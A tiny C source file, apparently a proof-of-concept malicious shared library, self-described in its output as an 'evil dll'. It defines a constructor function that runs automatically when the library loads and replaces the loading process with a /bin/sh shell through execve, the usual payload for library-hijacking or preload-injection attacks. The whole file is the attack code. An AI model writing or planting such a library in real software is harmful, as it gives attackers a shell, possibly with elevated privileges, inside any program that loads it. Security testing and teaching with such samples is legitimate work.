#include <stdio.h>
#include <unistd.h>

void __attribute__((constructor)) on_load() {
	printf("hello from evil dll\n");
	execve("/bin/sh", 0, 0);
}
